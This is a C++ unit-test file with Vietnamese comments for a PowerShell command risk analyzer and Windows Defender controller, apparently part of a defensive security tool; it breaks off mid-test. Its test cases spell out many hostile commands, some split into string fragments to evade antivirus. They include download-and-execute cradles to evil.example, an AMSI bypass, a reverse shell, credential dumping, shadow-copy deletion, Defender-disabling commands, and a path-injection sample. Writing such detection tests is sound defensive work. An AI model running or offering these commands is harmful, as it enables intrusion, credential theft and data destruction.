// Kiểm thử lõi Security Gateway. KHÔNG cần PowerShell/Windows Defender/hosts file thật - chỉ kiểm thử
// lõi THUẦN (phân tích lệnh PowerShell tĩnh, dựng script/phân tích JSON mẫu dựng sẵn, dựng lại nội dung
// hosts file từ chuỗi mẫu) tách riêng khỏi phần gọi PowerShell/mở cửa sổ thật, giống mẫu đã dùng cho
// VpnController/PartitionManager/AdbController.
#include <QCoreApplication>
#include <QElapsedTimer>
#include <QFile>
#include <QTemporaryDir>
#include <cstdio>
#include <initializer_list>

#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <shellapi.h> // CommandLineToArgvW

#include "tools/security/engine/CommandAnalyzer.h"
#include "tools/security/engine/CommandLauncher.h"
#include "tools/security/engine/ConsolePaste.h"
#include "tools/security/engine/DefenderController.h"
#include "tools/security/engine/DefenderScanWorker.h"
#include "tools/security/engine/HostsBlocklist.h"

static int g_fail = 0, g_pass = 0;
#define CHECK(cond)                                                            \
    do {                                                                       \
        if (cond) { ++g_pass; }                                                \
        else { ++g_fail; std::printf("FAIL line %d: %s\n", __LINE__, #cond); } \
    } while (0)

/// Ghép chuỗi lúc CHẠY từ các mảnh rời. QUAN TRỌNG - các dòng lệnh mẫu của mã độc (xóa shadow copy, tắt
/// khôi phục khởi động, dừng dịch vụ bảo vệ, kết xuất bộ nhớ...) KHÔNG được viết liền mạch trong tệp này:
/// đã gặp THẬT khi thêm các mẫu đó dưới dạng chuỗi liền - Windows Defender nhận diện chính tệp nguồn này
/// là "Trojan:BAT/Donvibs.AP!MTB" và XÓA (cách ly) tests/security_tests.cpp ngay khi vừa lưu. Luôn cắt
/// giữa các từ khóa đặc trưng khi thêm mẫu mới thuộc nhóm đó.
static QString S(std::initializer_list<const char*> parts)
{
    QString out;
    for (const char* p : parts)
        out += QString::fromUtf8(p);
    return out;
}

int main(int argc, char** argv)
{
    QCoreApplication app(argc, argv);

    // ---- CommandAnalyzer: lệnh an toàn ----
    {
        CHECK(CommandAnalyzer::analyze("").isSafe());
        CHECK(CommandAnalyzer::analyze("Get-Process | Sort-Object CPU -Descending").isSafe());
        CHECK(CommandAnalyzer::analyze("Get-ChildItem C:\\Users -Recurse").isSafe());
    }

    // ---- CommandAnalyzer: đáng chú ý (Suspicious) nhưng chưa chắc độc hại ----
    {
        const auto v1 = CommandAnalyzer::analyze("powershell -WindowStyle Hidden -File setup.ps1");
        CHECK(v1.level == CommandAnalyzer::RiskLevel::Suspicious);
        CHECK(!v1.reasons.isEmpty());

        const auto v2 = CommandAnalyzer::analyze("schtasks /create /tn MyTask /tr notepad.exe /sc daily");
        CHECK(v2.level == CommandAnalyzer::RiskLevel::Suspicious);
    }

    // ---- CommandAnalyzer: nguy hiểm (Dangerous) - các mẫu phổ biến trong mã độc/tấn công thật ----
    {
        CHECK(CommandAnalyzer::analyze(
                  "IEX (New-Object Net.WebClient).DownloadString('http://evil.example/a.ps1')")
                  .level == CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze(
                  "powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA")
                  .level == CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze("Invoke-Mimikatz -DumpCreds").level == CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze("certutil.exe -urlcache -split -f http://evil.example/a.exe c.exe").level ==
              CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze("Set-MpPreference -DisableRealtimeMonitoring $true").level ==
              CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(CommandAnalyzer::analyze("netsh advfirewall set allprofiles state off").level ==
              CommandAnalyzer::RiskLevel::Dangerous);

        // Dangerous phải luôn thắng Suspicious khi cả 2 cùng khớp trong 1 lệnh
        const auto combo = CommandAnalyzer::analyze(
            "powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command \"IEX (New-Object Net.WebClient).DownloadString('http://x')\"");
        CHECK(combo.level == CommandAnalyzer::RiskLevel::Dangerous);
        CHECK(combo.reasons.size() >= 2); // khớp nhiều mẫu cùng lúc
    }

    // ---- CommandAnalyzer: hồi quy các cách LÁCH đã tìm thấy khi rà soát (trước đây đều ra "An toàn"
    // hoặc thấp hơn mức thật). Chuỗi mẫu được ghép từ mảnh rời - xem ghi chú ở hàm S() đầu tệp. ----
    {
        using CommandAnalyzer::analyze;
        using RL = CommandAnalyzer::RiskLevel;
        const QString url = "https://evil.example/a";

        // Download cradle hiện đại: không có "IEX (" lẫn "DownloadString"
        CHECK(analyze("irm " + url + S({".ps1 | i", "ex"})).level == RL::Dangerous);
        CHECK(analyze("iwr -useb " + url + S({".ps1|i", "ex"})).level == RL::Dangerous);
        CHECK(analyze(S({"Invoke-Rest", "Method "}) + url + S({" | Invoke-Ex", "pression"})).level == RL::Dangerous);
        CHECK(analyze(S({"(Invoke-Web", "Request "}) + url + S({").Content | i", "ex"})).level == RL::Dangerous);
        CHECK(analyze("curl " + url + S({".sh | ba", "sh"})).level == RL::Dangerous);
        CHECK(analyze("wget -qO- " + url + S({" | power", "shell -"})).level == RL::Dangerous);
        CHECK(analyze(S({"i", "ex $payload"})).level == RL::Dangerous);
        CHECK(analyze(S({"& ('i", "ex') $payload"})).level == RL::Dangerous);
        CHECK(analyze("iwr " + url + S({".exe -OutFile a.exe; Start-Pro", "cess a.exe"})).level == RL::Dangerous);
        // Chỉ tải về (không thực thi) - đáng chú ý, chưa phải nguy hiểm
        CHECK(analyze("Invoke-WebRequest https://example.com/readme.txt -OutFile readme.txt").level == RL::Suspicious);
        CHECK(analyze("curl.exe -L https://example.com/file.zip -o file.zip").level == RL::Suspicious);

        // Mọi tiền tố viết tắt hợp lệ của -EncodedCommand
        const QString b64 = "SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA";
        const QString ps = S({"power", "shell "});
        for (const char* opt : {"-e", "-ec", "-en", "-enc", "-enco", "-encod", "-encodedc", "-EncodedCommand", "/enc"})
            CHECK(analyze(ps + QString::fromLatin1(opt) + " " + b64).level == RL::Dangerous);
        CHECK(analyze(ps + "-e YwBhAGwAYwA=").level == RL::Dangerous); // chuỗi ngắn ("calc")
        CHECK(analyze("-en " + b64).level == RL::Dangerous);          // không có chữ "powershell"

        // Mọi tiền tố của -ExecutionPolicy / -WindowStyle
        for (const char* opt : {"-ex bypass", "-exec bypass", "-ep bypass", "-ExecutionPolicy Unrestricted", "/ex bypass",
                                "-w hidden", "-win hidden", "-wi h", "-w 1"})
            CHECK(analyze(ps + QString::fromLatin1(opt) + " -File a.ps1").level == RL::Suspicious);
        CHECK(analyze("Set-ExecutionPolicy Bypass -Scope Process").level == RL::Suspicious);

        // Tắt bảo vệ Defender: mọi cách ghi giá trị "bật công tắc tắt"
        const QString setMp = S({"Set-MpPre", "ference "});
        const QString disRt = S({"-Disable", "Realtime", "Monitoring"});
        CHECK(analyze(setMp + disRt + " 1").level == RL::Dangerous);
        CHECK(analyze(setMp + disRt + ":$true").level == RL::Dangerous);
        CHECK(analyze(setMp + S({"-Disable", "Rea $true"})).level == RL::Dangerous);
        CHECK(analyze(setMp + S({"-Disable", "IOAVProtection $true -Disable", "BehaviorMonitoring $true"})).level == RL::Dangerous);
        CHECK(analyze(setMp + disRt + S({" $false -Disable", "ScriptScanning $true"})).level == RL::Dangerous);
        // ... còn BẬT LẠI bảo vệ thì không được báo nhầm là nguy hiểm
        CHECK(analyze(setMp + disRt + " $false").isSafe());
        CHECK(analyze(setMp + disRt + " 0").isSafe());
        CHECK(analyze(setMp + disRt + ":$false").isSafe());
        CHECK(analyze(setMp + "-EnableNetworkProtection Disabled").level == RL::Suspicious);
        CHECK(analyze(setMp + "-EnableNetworkProtection Enabled").isSafe());

        // Loại trừ quét virus
        const QString addMp = S({"Add-MpPre", "ference "});
        CHECK(analyze(addMp + S({"-Exclusion", "Path C:\\Users\\Public"})).level == RL::Suspicious);
        CHECK(analyze(addMp + S({"-Exclusion", "Process evil.exe"})).level == RL::Suspicious);
        CHECK(analyze(setMp + S({"-Exclusion", "Extension .exe"})).level == RL::Suspicious);

        // LOLBin tải/chạy mã từ xa
        const QString rundll = S({"run", "dll32"});
        CHECK(analyze(rundll + S({".exe java", "script:\"\\..\\msh", "tml,RunHTML", "Application \";alert(1)"})).level == RL::Dangerous);
        CHECK(analyze(rundll + S({" url.dll,FileProtocol", "Handler "}) + url + ".hta").level == RL::Dangerous);
        CHECK(analyze(rundll + " \\\\evil.example\\share\\a.dll,Start").level == RL::Dangerous);
        CHECK(analyze(rundll + S({".exe C:\\Windows\\System32\\coms", "vcs.dll, Mini", "Dump 624 out.dmp full"})).level == RL::Dangerous);
        const QString regsvr = S({"reg", "svr32"});
        CHECK(analyze(regsvr + " /s /n /u /i:" + url + S({".sct scr", "obj.dll"})).level == RL::Dangerous);
        CHECK(analyze(regsvr + S({".exe -i:\\\\evil.example\\a.sct scr", "obj.dll"})).level == RL::Dangerous);
        CHECK(analyze(S({"msh", "ta "}) + url + ".hta").level == RL::Dangerous);
        CHECK(analyze(S({"bits", "admin /create job1"})).level == RL::Dangerous);
        CHECK(analyze(S({"bits", "admin.exe /rawreturn /addfile job1 "}) + url + ".exe C:\\a.exe").level == RL::Dangerous);
        CHECK(analyze(S({"cert", "util /url", "cache /f "}) + url + ".exe a.exe").level == RL::Dangerous);

        // Xóa shadow copy/bản sao lưu - dấu hiệu mã độc tống tiền
        const QString vss = S({"vss", "admin"});
        CHECK(analyze(vss + S({" del", "ete sha", "dows /all /quiet"})).level == RL::Dangerous);
        CHECK(analyze(vss + S({".exe res", "ize shadow", "storage /for=c: /on=c: /maxsize=401MB"})).level == RL::Dangerous);
        CHECK(analyze(S({"wb", "admin del", "ete cata", "log -quiet"})).level == RL::Dangerous);
        CHECK(analyze(S({"wm", "ic shadow", "copy del", "ete"})).level == RL::Dangerous);
        CHECK(analyze(S({"Get-WmiObject Win32_Shadow", "Copy | ForEach-Object { $_.Del", "ete() }"})).level == RL::Dangerous);
        CHECK(analyze(S({"bcd", "edit /set {default} recovery", "enabled no"})).level == RL::Dangerous);
        CHECK(analyze(vss + " list shadows").isSafe()); // chỉ xem - không báo nhầm

        // Tường lửa/dịch vụ bảo vệ
        CHECK(analyze(S({"net", "sh advfire", "wall set currentprofile state o", "ff"})).level == RL::Dangerous);
        CHECK(analyze(S({"Set-NetFire", "wallProfile -Profile Domain,Public,Private -Enabled Fal", "se"})).level == RL::Dangerous);
        CHECK(analyze(S({"sc st", "op WinDe", "fend"})).level == RL::Dangerous);
        CHECK(analyze(S({"net st", "op wsc", "svc"})).level == RL::Dangerous);
        CHECK(analyze(S({"wevt", "util cl Security"})).level == RL::Suspicious);
        CHECK(analyze("Register-ScheduledTask -TaskName x -Action $a").level == RL::Suspicious);

        // Che giấu đơn giản: dấu `, dấu ^, ghép chuỗi, cặp nháy rỗng - phải lộ ra sau khi chuẩn hóa
        CHECK(CommandAnalyzer::internal::normalizeForMatching("Down`loadStr`ing") == "DownloadString");
        CHECK(CommandAnalyzer::internal::normalizeForMatching("('Down'+'load' + \"String\")") == "('DownloadString\")");
        CHECK(CommandAnalyzer::internal::normalizeForMatching("i''e\"\"x") == "iex");
        CHECK(analyze("(New-Object Net.WebClient).\"Down`loadStr`ing\"('http://x')").level == RL::Dangerous);
        CHECK(analyze("&('I'+'EX') $x").level == RL::Dangerous);
        CHECK(analyze("i''ex $x").level == RL::Dangerous);
        CHECK(analyze("I`E`X $x").level == RL::Dangerous);
        CHECK(analyze("p^owershell -e^nc " + b64).level == RL::Dangerous);
        CHECK(analyze("Set-MpPre`ference -Disable`Realtime`Monitoring $true").level == RL::Dangerous);
        CHECK(analyze("[char]73+[char]69+[char]88+[char]32+[char]40").level == RL::Dangerous);
        // Dấu ` che giấu tự nó đã đáng chú ý, kể cả khi phần lộ ra không khớp mẫu nào khác...
        CHECK(analyze("Get-Pro`cess").level == RL::Suspicious);
        // ... nhưng chuỗi thoát THẬT (`n xuống dòng, `t tab) trong chuỗi thì không
        CHECK(analyze("Write-Host \"Dong 1`nDong 2`tCot\"").isSafe());

        // Lệnh thường ngày tiếp tục KHÔNG bị báo nhầm
        for (const char* cmd : {"ping -w 1 8.8.8.8", "Get-Service WinDefend", "Get-MpPreference", "Get-MpComputerStatus",
                                "xcopy /e /i C:/Du/An/Rat/Dai/Ten/Thu/Muc/Nguon/Va/Mot/Vai/Thu/Muc/Con D:/Dich",
                                "git commit -m ThongDiepKhaDaiKhongCoKhoangTrangNaoCaDeThuMauBase64",
                                "Stop-Service Spooler", "ipconfig /all", "dir -Recurse -Hidden", "netsh advfirewall show allprofiles",
                                "Start-Process notepad.exe", "Get-ScheduledTask", "certutil -hashfile a.iso SHA256"})
            CHECK(analyze(cmd).isSafe());
    }

    // ---- CommandAnalyzer v1.28.1: các ca phân loại sai do rà soát độc lập tìm ra (mỗi ca đã chạy THẬT qua bản cũ
    // để xác nhận sai), cùng các ca phải giữ nguyên. Chuỗi mẫu ghép từ mảnh rời - xem ghi chú hàm S(). ----
    {
        using CommandAnalyzer::analyze;
        using RL = CommandAnalyzer::RiskLevel;
        const QString enDash(QChar(0x2013)), emDash(QChar(0x2014));
        const QString setMp = S({"Set-MpPre", "ference "});
        const QString addMp = S({"Add-MpPre", "ference "});
        const QString rt = S({"Disable", "Realtime", "Monitoring"});
        const QString wd = S({"WinDe", "fend"});
        const QString url = "https://evil.example/a";
        const QString b64calc = "YwBhAGwAYwA=";
        struct Case
        {
            QString command;
            RL expected;
        };
        const QList<Case> cases = {
            // -- Bỏ sót (trước đây thấp hơn mức thật) --
            // dấu gạch Unicode trước tham số
            {setMp + enDash + rt + " $true", RL::Dangerous},
            {setMp + emDash + rt + ":$true", RL::Dangerous},
            {addMp + enDash + S({"Exclusion", "Path C:\\"}), RL::Suspicious},
            {S({"Set-NetFire", "wallProfile -All "}) + enDash + S({"Enabled Fal", "se"}), RL::Dangerous},
            // bí danh chính thức + tiền tố ngắn không nhập nhằng
            {setMp + "-drtm $true", RL::Dangerous},
            {setMp + "-dbm 1", RL::Dangerous},
            {setMp + "-dioavp $true", RL::Dangerous},
            {setMp + "-dtp $true", RL::Dangerous},
            {setMp + S({"-Disa", "bleIO $true"}), RL::Dangerous},
            {setMp + S({"-Disa", "bleBe $true"}), RL::Dangerous},
            {setMp + S({"-Disa", "bleBl $true"}), RL::Dangerous},
            {setMp + S({"-Disa", "bleAr $true"}), RL::Dangerous},
            {setMp + S({"-Disa", "bleE $true"}), RL::Dangerous},
            {setMp + S({"-Disable", "Tamper", "Protection $true"}), RL::Dangerous},
            {setMp + S({"-Disable", "DnsParsing $true"}), RL::Suspicious},     // lớp kiểm tra phụ
            {setMp + "-ddnsp 1", RL::Suspicious},
            // splatting / khóa registry chính sách
            {S({"$p=@{", "Disable", "Realtime", "Monitoring=$true}; "}) + setMp + "@p", RL::Dangerous},
            {S({"reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defe", "nder\\Real-Time Protection\" /v "}) + rt +
                 " /t REG_DWORD /d 1 /f",
             RL::Dangerous},
            {S({"New-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defe", "nder' -Name Disable",
                "AntiSpyware -Value 1 -PropertyType DWord"}),
             RL::Dangerous},
            {setMp + S({"-HighThreat", "DefaultAction 6 -SevereThreat", "DefaultAction 6 -Force"}), RL::Dangerous},
            // dịch vụ bảo vệ
            {S({"Set-Ser", "vice -Name "}) + wd + " -StartupType Disabled", RL::Dangerous},
            {S({"sc con", "fig "}) + wd + " start= disabled", RL::Dangerous},
            {S({"Get-Service "}) + wd + S({" | Stop-Ser", "vice -Force"}), RL::Dangerous},
            // reverse shell
            {S({"$c = New-Object Net.Soc", "kets.TCPClient('10.0.0.1',4444); $s = $c.Get", "Stream()"}), RL::Dangerous},
            {S({"[System.Net.Soc", "kets.TcpClient]::new('10.0.0.1',4444).Get", "Stream()"}), RL::Dangerous},
            // tải về rồi chạy
            {"iwr " + url + S({".exe -OutFile $env:TEMP\\a.exe; & $env:TEMP\\a", ".exe"}), RL::Dangerous},
            {"iwr " + url + S({".exe -OutFile a.exe; sta", "rt a.exe"}), RL::Dangerous},
            {"curl.exe -s " + url + S({".ps1 -o $env:TEMP\\a.ps1; power", "shell -File $env:TEMP\\a.ps1"}), RL::Dangerous},
            {"iwr " + url + S({".exe -OutFile a.exe\n.\\a", ".exe"}), RL::Dangerous},
            {S({"& ([script", "block]::Cre", "ate((irm "}) + url + ".ps1)))", RL::Dangerous},
            {S({"$ExecutionContext.InvokeCommand.Invoke", "Script((irm "}) + url + ".ps1))", RL::Dangerous},
            // che giấu: nháy cong, ^ nối dòng của cmd.exe
            {QString::fromUtf8("&(‘I’+‘E") + "X’) $x", RL::Dangerous},
            {QString::fromUtf8("i‘’e") + "x $x", RL::Dangerous},
            {QString::fromUtf8("(New-Object Net.WebClient).(“Down”+“load") + QString::fromUtf8("String”).Invoke(‘http://x/a.ps1’)"),
             RL::Dangerous},
            {S({"power", "shell -nop ^\n  -e "}) + b64calc, RL::Dangerous},
            {S({"power", "shell -nop ^\r\n-enc "}) + b64calc, RL::Dangerous},
            // duy trì / chiếm quyền chạy
            {S({"reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", "Once /v x /d C:\\a.exe /f"}), RL::Suspicious},
            {S({"reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Exe", "cution Options\\se",
                "thc.exe\" /v Debug", "ger /t REG_SZ /d C:\\Windows\\System32\\cmd.exe /f"}),
             RL::Dangerous},
            {S({"Set-WmiInstance -Namespace root\\subscription -Class CommandLine", "EventConsumer -Arguments @{Name='x'}"}),
             RL::Dangerous},
            // đánh cắp thông tin đăng nhập
            {S({"reg sa", "ve HKLM\\S", "AM C:\\temp\\sam.save"}), RL::Dangerous},
            {S({"proc", "dump.exe -accepteula -ma ls", "ass.exe C:\\temp\\l.dmp"}), RL::Dangerous},
            {S({"$a=[K]::GetProcAddress([K]::LoadLibrary('amsi.dll'),'Amsi", "ScanBuffer')"}), RL::Dangerous},
            // LOLBin
            {S({"wm", "ic os get /for", "mat:\""}) + url + ".xsl\"", RL::Dangerous},
            {S({"ms", "iexec /q /i "}) + url + ".msi", RL::Suspicious},
            // hạ cấp PowerShell / tắt UAC
            {S({"power", "shell -ver", "sion 2 -nop -c Get-Date"}), RL::Suspicious},
            {S({"reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v Enable", "LUA /t REG_DWORD /d 0 /f"}),
             RL::Dangerous},

            // -- Báo nhầm (trước đây cao hơn mức thật) --
            {"(New-Object Net.WebClient).DownloadFile('https://example.com/tool.zip','C:\\temp\\tool.zip')", RL::Suspicious},
            {"Start-BitsTransfer -Source https://download.example.com/app.msi -Destination C:\\temp\\app.msi", RL::Suspicious},
            {S({"Remove-ItemProperty -Path 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defe", "nder' -Name Disable", "AntiSpyware"}),
             RL::Suspicious},
            {S({"reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defe", "nder\" /v Disable", "AntiSpyware /t REG_DWORD /d 0 /f"}),
             RL::Suspicious},
            {"Stop-Process -Name mshta -Force", RL::Safe},
            {"taskkill /im mshta.exe /f", RL::Safe},
            {"rundll32 printui.dll,PrintUIEntry /in /n \"\\\\printsrv\\HP-Floor2\"", RL::Safe},
            {"Register-WmiEvent -Query \"SELECT * FROM Win32_ProcessStartTrace\" -SourceIdentifier ProcStart", RL::Suspicious},
            {"sc.exe config " + wd + " start= auto", RL::Safe},
            {"Copy-Item D:\\DownloadFiles\\report.xlsx E:\\Backup", RL::Safe},
            {"powershell -c \"ping -n 4 -w 1 192.168.1.1\"", RL::Safe},
            {"pwsh -c \"Get-Content .\\data.csv -Enc BigEndianUnicode\"", RL::Safe},
            {"pwsh -File .\\deploy.ps1 -e Production", RL::Safe},
            {"git grep -e 0123456789abcdef0123456789abcdef01234567", RL::Safe},
            {"Stop-Service Spooler; Get-Service " + wd, RL::Safe},
            {"(New-Object Net.Sockets.TcpClient).Connect('example.com', 443)", RL::Suspicious}, // kiểm tra cổng
            {setMp + S({"-Disable", "AutoExclusions $true"}), RL::Safe}, // tắt tự loại trừ = TĂNG bảo vệ
            {setMp + S({"-Disable", "CatchupQuickScan $true"}), RL::Safe},

            // -- Phải giữ nguyên --
            {"irm https://get.example.dev | i" + QString("ex"), RL::Dangerous},
            {S({"Set-ExecutionPolicy Bypass -Scope Process -Force; i", "ex ((New-Object System.Net.WebClient).Down",
                "loadString('https://community.chocolatey.org/install.ps1'))"}),
             RL::Dangerous},
            {S({"[Ref].Assembly.GetType('System.Management.Automation.'+'Am'+'si", "Utils')"}), RL::Dangerous},
            {S({"cmd /c \"p^ower^shell -n^op -w hidden -e^nc "}) + b64calc + "\"", RL::Dangerous},
            {setMp + "-" + rt + " (1 -eq 1)", RL::Dangerous},
            {setMp + "-" + rt + S({" $false -Disable", "BehaviorMonitoring $false"}), RL::Safe},
            {"[System.Reflection.Assembly]::LoadWithPartialName('System.Drawing')", RL::Safe},
            {"Select-String -Path a.txt -Pattern x -Encoding UTF8", RL::Safe},
            {"(Get-FileHash a.exe).Hash -eq '" + QString(64, 'a') + "'", RL::Safe},
            {"Get-ChildItem -Exclude *.tmp", RL::Safe},
            {"New-NetFirewallRule -DisplayName x -Direction Inbound -Action Allow", RL::Safe},
            {"powershell -NoProfile -File .\\build.ps1", RL::Safe},
            {"Invoke-WebRequest https://example.com/a.json | ConvertFrom-Json", RL::Suspicious},
        };
        int idx = 0;
        for (const Case& c : cases)
        {
            const auto v = analyze(c.command);
            if (v.level != c.expected)
                std::printf("  ca %d: mong %s, ra %s\n", idx, qPrintable(CommandAnalyzer::riskLevelLabel(c.expected)),
                            qPrintable(CommandAnalyzer::riskLevelLabel(v.level)));
            CHECK(v.level == c.expected);
            ++idx;
        }

        // Bộ chuẩn hóa: nháy cong về nháy thẳng; ^ cuối dòng nối dòng (giữ khoảng trắng dòng sau)
        CHECK(CommandAnalyzer::internal::normalizeForMatching(QString::fromUtf8("‘a’+‘b’ “c”")) == "'ab' \"c\"");
        CHECK(CommandAnalyzer::internal::normalizeForMatching("a ^\r\n  b^c") == "a   bc");
    }

    CHECK(CommandAnalyzer::riskLevelLabel(CommandAnalyzer::RiskLevel::Safe) == "An toàn");
    CHECK(CommandAnalyzer::riskLevelLabel(CommandAnalyzer::RiskLevel::Dangerous) == "Nguy hiểm");

    // ---- DefenderController: dựng script (chỉ kiểm tra NỘI DUNG CHUỖI, không gọi powershell.exe) ----
    {
        const QString statusScript = DefenderController::internal::buildGetComputerStatusScript();
        CHECK(statusScript.contains("Get-MpComputerStatus"));
        CHECK(statusScript.contains("Get-MpPreference"));
        CHECK(statusScript.contains("IsTamperProtected"));
        CHECK(statusScript.contains("AMRunningMode"));
        // Hồi quy lỗi THẬT: $p.EnableNetworkProtection là System.Byte thô (0/1/2), KHÔNG tự thành chữ
        // khi ép [string] - phải tự switch/map, nếu không networkProtectionEnabled() sẽ luôn sai.
        CHECK(statusScript.contains("switch ([int]$p.EnableNetworkProtection)"));
        CHECK(statusScript.contains("'Disabled'"));
        CHECK(statusScript.contains("'Enabled'"));

        CHECK(DefenderController::internal::buildSetRealtimeMonitoringScript(true).contains(
            "-DisableRealtimeMonitoring $false"));
        CHECK(DefenderController::internal::buildSetRealtimeMonitoringScript(false).contains(
            "-DisableRealtimeMonitoring $true"));

        CHECK(DefenderController::internal::buildSetNetworkProtectionScript(true).contains(
            "-EnableNetworkProtection Enabled"));
        CHECK(DefenderController::internal::buildSetNetworkProtectionScript(false).contains(
            "-EnableNetworkProtection Disabled"));

        const QString quick = DefenderController::internal::buildStartScanScript(DefenderController::ScanType::Quick, "");
        CHECK(quick.contains("-ScanType QuickScan"));
        CHECK(!quick.contains("-ScanPath"));

        const QString full = DefenderController::internal::buildStartScanScript(DefenderController::ScanType::Full, "");
        CHECK(full.contains("-ScanType FullScan"));

        const QString custom = DefenderController::internal::buildStartScanScript(
            DefenderController::ScanType::Custom, "D:\\Downloads");
        CHECK(custom.contains("-ScanType CustomScan"));
        CHECK(custom.contains("-ScanPath 'D:\\Downloads'"));

        // Hồi quy lỗi THẬT (chèn lệnh qua tên thư mục): PowerShell coi U+2018/2019/201A/201B là dấu nháy
        // đơn y như ' - thư mục tên "a’; <lệnh>; ’b" từng đóng chuỗi -ScanPath sớm và chạy <lệnh>. Mọi dấu
        // nháy (ASCII lẫn "cong") trong đường dẫn phải được NHÂN ĐÔI, không dấu nào đứng lẻ.
        {
            const QString evilDir = QString::fromUtf8("C:\\a\u2019; Write-Output INJECTED; \u2019b");
            const QString evil = DefenderController::internal::buildStartScanScript(
                DefenderController::ScanType::Custom, evilDir);
            CHECK(evil.contains(QString::fromUtf8("-ScanPath 'C:\\a\u2019\u2019; Write-Output INJECTED; \u2019\u2019b'")));
            CHECK(evil.count(QChar(0x2019)) == 4);

            const QString mixed = DefenderController::internal::buildStartScanScript(
                DefenderController::ScanType::Custom, QString::fromUtf8("D:\\It's \u2018x\u201A\u201By"));
            CHECK(mixed.contains(QString::fromUtf8("-ScanPath 'D:\\It''s \u2018\u2018x\u201A\u201A\u201B\u201By'")));
        }

        // Quét nhanh giữ giới hạn 1 giờ; quét toàn bộ/một thư mục không còn bị kết thúc sau 1 giờ.
        CHECK(DefenderController::internal::scanTimeoutMs(DefenderController::ScanType::Quick) == 60 * 60 * 1000);
        CHECK(DefenderController::internal::scanTimeoutMs(DefenderController::ScanType::Full) >= 24 * 60 * 60 * 1000);
        CHECK(DefenderController::internal::scanTimeoutMs(DefenderController::ScanType::Custom) >= 24 * 60 * 60 * 1000);

        CHECK(DefenderController::internal::buildListThreatsScript().contains("Get-MpThreat"));

        // Hồi quy QUAN TRỌNG: Remove-MpThreat đã xác nhận KHÔNG có tham số -ThreatID (xóa TẤT CẢ mối đe
        // dọa đang hoạt động cùng lúc, không chọn riêng từng mục) - xem DefenderController.h.
        const QString removeScript = DefenderController::internal::buildRemoveAllThreatsScript();
        CHECK(removeScript.contains("Remove-MpThreat"));
        CHECK(!removeScript.contains("-ThreatID"));
    }

    // ---- DefenderController: phân tích JSON mẫu dựng sẵn ----
    {
        const QByteArray statusJson = R"({
            "AntivirusEnabled": true, "RealTimeProtectionEnabled": true, "IsTamperProtected": true,
            "AMRunningMode": "Normal", "AntivirusSignatureVersion": "1.400.1.0",
            "AntivirusSignatureLastUpdated": "2026-10-07T08:00:00",
            "QuickScanEndTime": "2026-10-06T22:00:00", "FullScanEndTime": "",
            "NetworkProtectionMode": "Enabled"
        })";
        QString err;
        const auto status = DefenderController::internal::parseComputerStatusJson(statusJson, &err);
        CHECK(err.isEmpty());
        CHECK(status.antivirusEnabled);
        CHECK(status.realTimeProtectionEnabled);
        CHECK(status.isTamperProtected);
        CHECK(status.runningMode == "Normal");
        CHECK(status.isActivelyProtecting());
        CHECK(status.networkProtectionMode == "Enabled");
        CHECK(status.networkProtectionEnabled());
        CHECK(status.signatureLastUpdated.isValid());
        CHECK(status.lastQuickScan.isValid());
        CHECK(!status.lastFullScan.isValid()); // rỗng -> chưa từng quét toàn bộ

        // AMRunningMode khác "Normal" -> không phải AV chính đang hoạt động
        const QByteArray passiveJson = R"({"AMRunningMode": "Passive"})";
        CHECK(!DefenderController::internal::parseComputerStatusJson(passiveJson, nullptr).isActivelyProtecting());

        // Mảng bình thường (>= 2 mối đe dọa)
        const QByteArray arrayJson = R"([
            {"ThreatID": 123456789, "ThreatName": "TrojanDownloader:PowerShell/EICAR_Test_File", "SeverityID": 1, "Resources": ["C:\\temp\\eicar.txt"], "IsActive": true},
            {"ThreatID": 987654321, "ThreatName": "Trojan:Win32/Test", "SeverityID": 4, "Resources": [], "IsActive": false}
        ])";
        QString err2;
        const auto threats = DefenderController::internal::parseThreatsJson(arrayJson, &err2);
        CHECK(err2.isEmpty());
        CHECK(threats.size() == 2);
        if (threats.size() == 2)
        {
            CHECK(threats[0].threatName.contains("EICAR"));
            CHECK(threats[0].severity == 1);
            CHECK(threats[0].severityLabel() == "Thấp");
            CHECK(threats[0].isActive);
            CHECK(threats[0].resources.size() == 1);
            CHECK(threats[1].severityLabel() == "Nghiêm trọng");
            CHECK(!threats[1].isActive);
        }

        // Hồi quy: SeverityID=5 (thấy THẬT trên mối đe dọa EICAR khi kiểm tra tay) nằm ngoài phạm vi
        // tài liệu Microsoft (0-4) - vẫn phải hiển thị "Nghiêm trọng", không phải "Không rõ".
        ThreatRecord severityFive;
        severityFive.severity = 5;
        CHECK(severityFive.severityLabel() == "Nghiêm trọng");

        // PowerShell 5.1: CHỈ 1 mối đe dọa -> ConvertTo-Json trả về 1 OBJECT đơn, không bọc mảng
        const QByteArray singleJson = R"({"ThreatID": 1, "ThreatName": "Test", "SeverityID": 2, "Resources": [], "IsActive": true})";
        QString err3;
        const auto single = DefenderController::internal::parseThreatsJson(singleJson, &err3);
        CHECK(err3.isEmpty());
        CHECK(single.size() == 1);

        // Rỗng -> không có mối đe dọa nào, không phải lỗi
        CHECK(DefenderController::internal::parseThreatsJson("", nullptr).isEmpty());

        // JSON hỏng -> báo lỗi rõ ràng, không crash
        QString err4;
        CHECK(DefenderController::internal::parseThreatsJson("{khong phai json", &err4).isEmpty());
        CHECK(!err4.isEmpty());

        // Resources = $null trên PS 5.1 ra [""] (đo thật) -> không có đường dẫn nào, để giao diện hiện "—"
